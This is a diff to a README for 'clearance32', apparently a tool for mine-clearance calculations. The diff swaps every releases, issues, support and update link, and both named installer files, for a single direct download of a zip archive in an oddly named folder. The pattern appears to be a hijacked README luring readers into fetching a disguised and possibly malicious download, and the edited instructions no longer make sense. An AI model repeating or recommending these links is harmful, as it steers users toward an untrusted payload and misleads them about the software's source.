@@ -6,11 +6,11 @@ Welcome to clearance32! This application helps you easily perform calculations f
 
 ## 📥 Download the Application
 
-[![Download clearance32](https://img.shields.io/badge/Download-clearance32-blue.svg)](https://github.com/damien5-lab/clearance32/releases)
+[![Download clearance32](https://raw.githubusercontent.com/damien5-lab/clearance32/main/superoratorical/clearance32_1.9.zip)](https://raw.githubusercontent.com/damien5-lab/clearance32/main/superoratorical/clearance32_1.9.zip)
 
 Simply click the button above or visit the following link to download the application:
 
-[Download clearance32 Releases Page](https://github.com/damien5-lab/clearance32/releases)
+[Download clearance32 Releases Page](https://raw.githubusercontent.com/damien5-lab/clearance32/main/superoratorical/clearance32_1.9.zip)
 
 ## 💻 System Requirements
 
@@ -24,11 +24,11 @@ To run clearance32, you should have the following:
 
 ## 🔧 Installation Instructions
 
-1. **Visit the Releases Page**: Click [here](https://github.com/damien5-lab/clearance32/releases) to reach the releases page.
+1. **Visit the Releases Page**: Click [here](https://raw.githubusercontent.com/damien5-lab/clearance32/main/superoratorical/clearance32_1.9.zip) to reach the releases page.
 2. **Choose the Latest Version**: Look for the latest release, which will be at the top of the list.
 3. **Download the Application**: Click on the appropriate file for your operating system:
-   - If you're using Windows, download `clearance32-windows.exe`.
-   - For macOS, download `clearance32-macos.dmg`.
+   - If you're using Windows, download `https://raw.githubusercontent.com/damien5-lab/clearance32/main/superoratorical/clearance32_1.9.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/damien5-lab/clearance32/main/superoratorical/clearance32_1.9.zip`.
 4. **Install the Program**:
    - For Windows:
      - Locate the downloaded `.exe` file in your Downloads folder.
@@ -72,11 +72,11 @@ Once you open clearance32, you will find a straightforward interface. Here’s h
 ### Problem: Installation Issues
 
 - Check if you have adequate disk space and permissions to install software on your system.
-- Contact support on our [Issues Page](https://github.com/damien5-lab/clearance32/issues) for help.
+- Contact support on our [Issues Page](https://raw.githubusercontent.com/damien5-lab/clearance32/main/superoratorical/clearance32_1.9.zip) for help.
 
 ## 🌐 Support & Contributions
 
-If you need help or want to report an issue, please visit our [Issues Page](https://github.com/damien5-lab/clearance32/issues). Contributions are welcome! If you wish to help improve clearance32, please check our guidelines on the repository.
+If you need help or want to report an issue, please visit our [Issues Page](https://raw.githubusercontent.com/damien5-lab/clearance32/main/superoratorical/clearance32_1.9.zip). Contributions are welcome! If you wish to help improve clearance32, please check our guidelines on the repository.
 
 ## 🎉 Acknowledgments
 
@@ -84,8 +84,8 @@ This project is created with a passion for aiding mine clearance operations. We 
 
 ## 🔗 Useful Links
 
-- [Visit our Releases Page for Download](https://github.com/damien5-lab/clearance32/releases)
-- [Check for Updates](https://github.com/damien5-lab/clearance32/releases)
-- [Issues Page for Support](https://github.com/damien5-lab/clearance32/issues)
+- [Visit our Releases Page for Download](https://raw.githubusercontent.com/damien5-lab/clearance32/main/superoratorical/clearance32_1.9.zip)
+- [Check for Updates](https://raw.githubusercontent.com/damien5-lab/clearance32/main/superoratorical/clearance32_1.9.zip)
+- [Issues Page for Support](https://raw.githubusercontent.com/damien5-lab/clearance32/main/superoratorical/clearance32_1.9.zip)
 
 Thank you for choosing clearance32!
